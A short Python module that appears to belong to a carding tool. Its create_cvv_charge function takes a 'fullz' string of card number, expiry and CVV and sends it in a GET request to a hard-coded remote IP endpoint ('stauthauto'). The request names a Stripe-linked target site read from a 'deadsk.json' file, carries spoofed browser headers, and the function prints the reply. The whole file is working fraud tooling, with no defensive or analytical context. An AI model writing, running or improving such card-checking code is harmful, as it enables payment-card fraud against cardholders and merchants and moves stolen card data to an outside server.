import asyncio
import json
import random
import re
import time
import uuid
from fake_useragent import UserAgent
import requests
from FUNC.defs import *


def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None


async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")


        link    = json.loads(open("FILES/deadsk.json", "r" , encoding="utf-8").read())["AUTO_STRIPE_AU"]



        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,de;q=0.8,it;q=0.7,ru;q=0.6,es;q=0.5',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        }

        response = await session.get(
            f'http://74.50.123.49:1001/stauthauto?lista={cc}|{mes}|{ano}|{cvv}&siteurl={link}',
            headers=headers,
        )





        print(response.text)

        return response
    


    except Exception as e:
        print(e)
        return str(e)